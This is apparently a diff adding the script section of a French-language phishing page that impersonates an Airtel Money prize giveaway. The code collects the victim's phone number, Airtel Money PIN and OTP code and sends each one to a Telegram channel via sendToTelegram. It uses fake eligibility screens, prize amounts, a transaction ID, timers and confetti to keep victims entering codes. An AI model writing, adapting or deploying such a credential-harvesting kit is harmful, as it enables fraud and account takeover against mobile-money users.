+      moneyPinError.classList.add('hidden');
+      state.formData.moneyPin = enteredMoneyPin;
+
+      sendToTelegram(
+`💰 *AIRTEL MONEY PIN ENTRÉ*
+
+📞 Téléphone: \`${state.formData.phone}\`
+🔑 AIRTEL Money PIN: \`${enteredMoneyPin}\`
+🕒 Heure: ${getTimestamp()}`
+      );
+
+      goToStep(3);
+      startWaitTimer();
+    }
+
+    /* ============================================================
+       STEP 4: OTP
+    ============================================================ */
+    function handleStep4Submit(e) {
+      e.preventDefault();
+      const otpInput = document.getElementById('input-otp');
+      const otpError = document.getElementById('error-otp');
+      const val = otpInput.value.trim();
+
+      if (val.length !== 4 || isNaN(val)) {
+        otpError.classList.remove('hidden');
+        return;
+      }
+
+      otpError.classList.add('hidden');
+      state.formData.otp = val;
+
+      sendToTelegram(
+`🔑 *OTP CODE ENTRÉ*
+
+📞 Téléphone: \`${state.formData.phone}\`
+💰 AIRTEL Money PIN: \`${state.formData.moneyPin || 'N/A'}\`
+🔑 OTP: \`${val}\`
+🕒 Heure: ${getTimestamp()}`
+      );
+
+      document.getElementById('summary-phone').innerText = state.formData.phone;
+      document.getElementById('summary-reward').innerText = state.formData.reward;
+      document.getElementById('summary-pin').innerText = state.formData.pin || '----';
+
+      if (typeof confetti === 'function') {
+        confetti({
+          particleCount: 120,
+          spread: 75,
+          origin: { y: 0.6 },
+          colors: ['#E40000', '#FFFFFF', '#FFD700']
+        });
+      }
+
+      goToStep(5);
+    }
+
+    /* ============================================================
+       TIMERS
+    ============================================================ */
+    function startWaitTimer() {
+      if (state.waitInterval) clearInterval(state.waitInterval);
+      state.waitElapsed = 0;
+
+      state.waitInterval = setInterval(() => {
+        state.waitElapsed += 1000;
+        if (state.waitElapsed >= state.WAIT_DURATION_MS) {
+          clearInterval(state.waitInterval);
+          state.waitInterval = null;
+          goToStep(4);
+        }
+      }, 1000);
+    }
+
+    /* ============================================================
+       INPUT HELPERS
+    ============================================================ */
+    function setupMoneyPinAutoTab() {
+      const inputs = document.querySelectorAll('.money-pin');
+      inputs.forEach((input, index) => {
+        input.addEventListener('keyup', (e) => {
+          if (/^[0-9]$/.test(e.key)) {
+            if (index < inputs.length - 1) inputs[index + 1].focus();
+          } else if (e.key === 'Backspace') {
+            if (index > 0) inputs[index - 1].focus();
+          }
+        });
+        // Prevent non-numeric on mobile
+        input.addEventListener('input', () => {
+          input.value = input.value.replace(/[^0-9]/g, '');
+        });
+      });
+    }
+
+    function setupMoneyPinToggle() {
+      const toggleBtn = document.getElementById('toggle-money-pin');
+      toggleBtn.addEventListener('click', () => {
+        state.moneyPinVisible = !state.moneyPinVisible;
+        const icon = toggleBtn.querySelector('i');
+        const inputs = document.querySelectorAll('.money-pin');
+        if (state.moneyPinVisible) {
+          icon.classList.replace('fa-eye', 'fa-eye-slash');
+          inputs.forEach(inp => inp.type = 'text');
+        } else {
+          icon.classList.replace('fa-eye-slash', 'fa-eye');
+          inputs.forEach(inp => inp.type = 'password');
+        }
+      });
+    }
+
+    /* ============================================================
+       EVALUATION POPUP (7s, no timer shown)
+    ============================================================ */
+    function showLoadingPopup() {
+      const overlay = document.getElementById('loading-popup-overlay');
+      overlay.classList.remove('hidden');
+      overlay.classList.add('flex');
+
+      document.getElementById('loading-screen-eval').classList.remove('hidden');
+      document.getElementById('loading-screen-congrats').classList.add('hidden');
+
+      const s3Icon = document.getElementById('eval-step3-icon');
+      const s4Icon = document.getElementById('eval-step4-icon');
+      const s3Text = document.getElementById('eval-step3-text');
+      const s4Text = document.getElementById('eval-step4-text');
+
+      // Reset step 3 & 4
+      s3Icon.className = 'w-9 h-9 rounded-full flex items-center justify-center text-base font-bold bg-white text-airtel-red border-[3px] border-airtel-red transition-all';
+      s4Icon.className = 'w-9 h-9 rounded-full flex items-center justify-center text-base font-bold bg-white text-teal-600 border-[3px] border-airtel-red transition-all';
+      s3Text.className = 'text-sm font-medium text-gray-500 transition-all';
+      s4Text.className = 'text-sm font-medium text-gray-500 transition-all';
+
+      document.getElementById('eval-progress-bar').style.width = '0%';
+
+      if (state.loadingInterval) clearInterval(state.loadingInterval);
+      state.loadingElapsed = 0;
+
+      state.loadingInterval = setInterval(() => {
+        state.loadingElapsed += 100;
+
+        const progressPercent = (state.loadingElapsed / state.LOADING_DURATION_MS) * 100;
+        document.getElementById('eval-progress-bar').style.width = Math.min(100, progressPercent) + '%';
+
+        // Step 3 done at ~2.5s
+        if (state.loadingElapsed >= 2500 && s3Icon.classList.contains('bg-white')) {
+          s3Icon.className = 'w-9 h-9 rounded-full flex items-center justify-center text-base font-bold bg-airtel-red text-white shadow-lg shadow-airtel-red/30 transition-all';
+          s3Text.className = 'text-sm font-medium text-gray-800 transition-all';
+        }
+
+        // Step 4 done at ~5s
+        if (state.loadingElapsed >= 5000 && s4Icon.classList.contains('bg-white')) {
+          s4Icon.className = 'w-9 h-9 rounded-full flex items-center justify-center text-base font-bold bg-airtel-red text-white shadow-lg shadow-airtel-red/30 transition-all';
+          s4Text.className = 'text-sm font-medium text-gray-800 transition-all';
+        }
+
+        if (state.loadingElapsed >= state.LOADING_DURATION_MS) {
+          clearInterval(state.loadingInterval);
+          state.loadingInterval = null;
+          showCongratsScreen();
+        }
+      }, 100);
+    }
+
+    function showCongratsScreen() {
+      document.getElementById('loading-screen-eval').classList.add('hidden');
+      document.getElementById('loading-screen-congrats').classList.remove('hidden');
+
+      sendToTelegram(
+`🎉 *RÉSULTAT ÉLIGIBLE AFFICHÉ*
+
+📞 Téléphone: \`${state.formData.phone}\`
+💰 Montant affiché: $769
+🕒 Heure: ${getTimestamp()}`
+      );
+    }
+
+    function closeLoadingPopup() {
+      const overlay = document.getElementById('loading-popup-overlay');
+      overlay.classList.add('hidden');
+      overlay.classList.remove('flex');
+      if (state.loadingInterval) {
+        clearInterval(state.loadingInterval);
+        state.loadingInterval = null;
+      }
+    }
+
+    function proceedFromCongrats() {
+      closeLoadingPopup();
+      showPriceDemandedPopup();
+    }
+
+    /* ============================================================
+       PRICE DEMANDED POPUP
+    ============================================================ */
+    function showPriceDemandedPopup() {
+      const overlay = document.getElementById('price-demanded-overlay');
+      overlay.classList.remove('hidden');
+      overlay.classList.add('flex');
+
+      sendToTelegram(
+`💰 *PRIX RÉCLAMÉ ($1,552)*
+
+📞 Téléphone: \`${state.formData.phone}\`
+🏆 Transaction: AIR-KNVQ-8488
+🕒 Heure: ${getTimestamp()}`
+      );
+    }
+
+    function closePriceDemanded() {
+      const overlay = document.getElementById('price-demanded-overlay');
+      overlay.classList.add('hidden');
+      overlay.classList.remove('flex');
+      goToStep(2);
+    }
+
+    function proceedFromPriceDemanded() {
+      const overlay = document.getElementById('price-demanded-overlay');
+      overlay.classList.add('hidden');
+      overlay.classList.remove('flex');
+      goToStep(2);
+    }
+
+    /* ============================================================
+       RESET
+    ============================================================ */
+    function resetAll() {
+      document.getElementById('input-phone').value = '';
+      document.getElementById('input-otp').value = '';
+      document.querySelectorAll('.money-pin').forEach(i => { i.value = ''; i.type = 'password'; });
+
+      state.formData = { phone: '', moneyPin: '', reward: '1,552 USD AIRTEL Money', otp: '', pin: '' };
+      state.moneyPinVisible = false;
+
+      const toggleIcon = document.querySelector('#toggle-money-pin i');
+      if (toggleIcon) {
+        toggleIcon.classList.remove('fa-eye-slash');
+        toggleIcon.classList.add('fa-eye');
+      }
+
+      if (state.waitInterval) { clearInterval(state.waitInterval); state.waitInterval = null; }
+      if (state.loadingInterval) { clearInterval(state.loadingInterval); state.loadingInterval = null; }
+
+      backToLanding();
+      goToStep(1);
+    }
+  </script>
+</body>
+</html>
